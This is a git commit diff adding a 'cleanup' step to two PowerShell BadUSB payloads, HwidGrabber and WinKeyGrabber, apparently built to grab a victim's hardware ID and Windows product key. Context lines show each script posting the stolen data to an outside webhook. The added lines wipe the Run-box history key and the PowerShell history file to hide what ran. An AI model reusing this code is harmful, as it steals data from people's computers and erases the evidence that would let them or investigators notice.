fe9de4c78b2f9c8d864eee2134000a14e8afc1fe
sealldeveloper <120470330+sealldeveloper@users.noreply.github.com>
2023-01-07 17:28:34 +1100

    added cleanup

--- badusb/HwidGrabber/HwidGrabber.ps1
+++ badusb/HwidGrabber/HwidGrabber.ps1
@@ -28,3 +28,11 @@ $payload = [PSCustomObject]@{
 }
 #Send over payload, converting it to JSON
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
--- badusb/WinKeyGrabber/WinKeyGrabber.ps1
+++ badusb/WinKeyGrabber/WinKeyGrabber.ps1
@@ -18,3 +18,11 @@ $payload = [PSCustomObject]@{
     embeds = $embedArray
 }
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
